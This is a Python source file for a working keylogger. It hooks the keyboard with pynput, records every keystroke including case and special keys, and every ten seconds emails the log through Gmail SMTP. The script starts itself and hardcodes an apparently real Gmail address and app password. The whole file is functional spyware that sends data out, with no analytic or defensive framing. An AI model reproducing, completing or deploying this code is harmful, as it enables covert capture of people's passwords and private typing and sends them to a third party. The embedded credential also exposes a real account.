import smtplib
import pynput.keyboard
import threading
from pynput.keyboard import Key


class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger Started!\n"
        self.time_interval = time_interval
        self.email = email
        self.password = password
        self.is_shift_pressed = False  # Track the Shift key
        self.is_capslock_on = False  # Track the Caps Lock state

    def append_log(self, string):
        self.log += string

    def keypress(self, key):
        """Handles keypress events and formats special keys in a simpler way."""
        try:
            # Try to capture character keys (regular keys)
            ck = str(key.char)
            if self.is_capslock_on:
                if self.is_shift_pressed:
                    ck = ck.lower()  # Shift + CapsLock = lowercase
                else:
                    ck = ck.upper()  # CapsLock = uppercase
            else:
                if self.is_shift_pressed:
                    ck = ck.upper()  # Shift = uppercase
                else:
                    ck = ck.lower()  # No Shift = lowercase
        except AttributeError:
            # Handle special keys with custom labels
            if key == Key.space:
                ck = " "  # Represent space as a space
            elif key == Key.enter:
                ck = "\n"  # Represent enter key as a new line
            elif key == Key.tab:
                ck = "TAB"  # Represent tab as TAB
            elif key in [Key.alt_l, Key.alt_r]:
                ck = "ALT"  # Represent alt key as ALT
            elif key in [Key.ctrl_l, Key.ctrl_r]:
                ck = "CTRL"  # Represent ctrl key as CTRL
            elif key in [Key.shift, Key.shift_r]:
                self.is_shift_pressed = True  # Shift is pressed
                ck = ""  # Don't log shift itself
            elif key == Key.caps_lock:
                self.is_capslock_on = not self.is_capslock_on  # Toggle Caps Lock
                ck = "CAPS_LOCK"
            elif key == Key.backspace:
                # Handle backspace by removing the last character from the log
                if self.log:  # Check if log is not empty
                    self.log = self.log[:-1]  # Remove the last character
                ck = ""  # Don't log backspace itself
            else:
                ck = str(key).replace("Key.", "").upper()  # Other special keys

        if ck:  # Only append if ck is not empty
            self.append_log(ck)

    def keyrelease(self, key):
        """Handles key release events to track Shift key."""
        if key in [Key.shift, Key.shift_r]:
            self.is_shift_pressed = False  # Shift is released

    def report(self):
        """Send the log every interval and clear the log."""
        if self.log.strip():  # Send email only if there is content in the log
            print(self.log)  # For testing, print the log
            self.send_mail(self.email, self.password, self.log)  # Send the log via email
            self.log = ""  # Clear the log after sending
        threading.Timer(self.time_interval, self.report).start()

    def send_mail(self, email, password, message):
        """Function to send the keylogger report via email."""
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, message)
            server.quit()
            print("Log sent successfully.")
        except smtplib.SMTPException as e:
            print(f"SMTP error occurred: {e}")
        except Exception as e:
            print(f"An error occurred: {e}")

    def start(self):
        """Start the keylogger."""
        keyboard_listener = pynput.keyboard.Listener(on_press=self.keypress, on_release=self.keyrelease)
        with keyboard_listener:
            self.report()  # Start the reporting function
            keyboard_listener.join()  # Join the listener thread


# Create a Keylogger object and start it
keylogger = Keylogger(time_interval=10, email="tejasreea85@gmail.com", password="zknu qizk jslg czpf")
keylogger.start()
